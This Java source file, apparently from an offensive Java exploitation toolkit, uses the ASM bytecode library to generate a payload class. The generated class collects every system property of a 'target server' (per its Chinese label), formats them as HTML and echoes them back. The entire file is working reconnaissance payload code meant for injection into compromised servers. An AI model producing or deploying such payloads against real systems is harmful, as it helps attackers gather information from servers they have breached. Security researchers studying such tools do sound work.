package org.su18.asm.payload;

import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

public class BasicInfo implements Opcodes {

	public static void insert(String className, MethodVisitor mv) {

		Label label0 = new Label();
		mv.visitLabel(label0);
		mv.visitVarInsn(ALOAD, 0);
		mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
		Label label1 = new Label();
		mv.visitLabel(label1);
		mv.visitTypeInsn(NEW, "java/lang/StringBuilder");
		mv.visitInsn(DUP);
		mv.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
		mv.visitVarInsn(ASTORE, 1);
		Label label2 = new Label();
		mv.visitLabel(label2);
		mv.visitVarInsn(ALOAD, 1);
		mv.visitLdcInsn("\u76ee\u6807\u670d\u52a1\u5668\u57fa\u672c\u4fe1\u606f\u4e3a\uff1a<br>");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
		mv.visitInsn(POP);
		Label label3 = new Label();
		mv.visitLabel(label3);
		mv.visitMethodInsn(INVOKESTATIC, "java/lang/System", "getProperties", "()Ljava/util/Properties;", false);
		mv.visitVarInsn(ASTORE, 2);
		Label label4 = new Label();
		mv.visitLabel(label4);
		mv.visitVarInsn(ALOAD, 2);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/util/Properties", "stringPropertyNames", "()Ljava/util/Set;", false);
		mv.visitMethodInsn(INVOKEINTERFACE, "java/util/Set", "iterator", "()Ljava/util/Iterator;", true);
		mv.visitVarInsn(ASTORE, 3);
		Label label5 = new Label();
		mv.visitLabel(label5);
		mv.visitFrame(Opcodes.F_FULL, 4, new Object[]{className, "java/lang/StringBuilder", "java/util/Properties", "java/util/Iterator"}, 0, new Object[]{});
		mv.visitVarInsn(ALOAD, 3);
		mv.visitMethodInsn(INVOKEINTERFACE, "java/util/Iterator", "hasNext", "()Z", true);
		Label label6 = new Label();
		mv.visitJumpInsn(IFEQ, label6);
		mv.visitVarInsn(ALOAD, 3);
		mv.visitMethodInsn(INVOKEINTERFACE, "java/util/Iterator", "next", "()Ljava/lang/Object;", true);
		mv.visitTypeInsn(CHECKCAST, "java/lang/String");
		mv.visitVarInsn(ASTORE, 4);
		Label label7 = new Label();
		mv.visitLabel(label7);
		mv.visitVarInsn(ALOAD, 1);
		mv.visitVarInsn(ALOAD, 4);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
		mv.visitLdcInsn(":");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
		mv.visitVarInsn(ALOAD, 2);
		mv.visitVarInsn(ALOAD, 4);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/util/Properties", "getProperty", "(Ljava/lang/String;)Ljava/lang/String;", false);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
		mv.visitLdcInsn("<br>");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
		mv.visitInsn(POP);
		Label label8 = new Label();
		mv.visitLabel(label8);
		mv.visitJumpInsn(GOTO, label5);
		mv.visitLabel(label6);
		mv.visitFrame(Opcodes.F_CHOP, 1, null, 0, null);
		mv.visitVarInsn(ALOAD, 0);
		mv.visitVarInsn(ALOAD, 1);
		mv.visitMethodInsn(INVOKESTATIC, "java/lang/String", "valueOf", "(Ljava/lang/Object;)Ljava/lang/String;", false);
		mv.visitFieldInsn(PUTFIELD, className, "result", "Ljava/lang/String;");
		Label label9 = new Label();
		mv.visitLabel(label9);
		mv.visitVarInsn(ALOAD, 0);
		mv.visitMethodInsn(INVOKEVIRTUAL, className, "echo", "()V", false);
		Label label10 = new Label();
		mv.visitLabel(label10);
		mv.visitInsn(RETURN);
		Label label11 = new Label();
		mv.visitLabel(label11);
		mv.visitLocalVariable("key", "Ljava/lang/String;", null, label7, label8, 4);
		mv.visitLocalVariable("this", "L" + className + ";", null, label0, label11, 0);
		mv.visitLocalVariable("result", "Ljava/lang/StringBuilder;", null, label2, label11, 1);
		mv.visitLocalVariable("props", "Ljava/util/Properties;", null, label4, label11, 2);

	}

}
